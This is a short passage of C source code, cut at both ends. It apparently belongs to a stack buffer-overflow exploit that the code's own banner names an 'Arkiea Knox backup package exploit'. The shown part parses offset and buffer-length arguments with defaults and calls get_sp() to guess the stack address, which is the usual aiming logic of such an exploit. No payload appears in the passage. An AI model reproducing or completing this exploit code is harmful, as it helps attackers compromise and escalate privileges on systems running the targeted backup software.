", argv[0]); exit(0); } else if (argc == 2){ offset=atoi(argv[1]); } else if (argc == 3) { offset=atoi(argv[1]); buflen=atoi(argv[2]); } else { offset=2800; buflen=1200; } addr=get_sp(); fprintf(stderr, "Arkiea Knox backup package exploit
